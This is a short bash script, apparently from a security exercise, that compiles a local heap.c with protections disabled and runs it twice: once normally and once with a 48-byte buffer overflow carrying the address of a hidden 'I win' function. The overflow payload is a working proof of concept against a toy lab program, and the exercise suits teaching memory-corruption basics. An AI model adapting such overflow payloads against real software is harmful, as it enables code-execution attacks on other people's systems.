#!/bin/bash

echo "\nSetting bash to output commands as well as results.\n"

# Set bash to output the commands as well.
set -x

# Compile the heap file.
gcc -w -g -m32 -no-pie -o heap heap.c

# Run heap with a single input.
./heap A

# Run heap with a 48-byte buffer overflow as well as the addr of the hidden "I win :-)" function.
./heap `python2 -c "print 'A'*48 + '\xda\x91\x04\x08'"`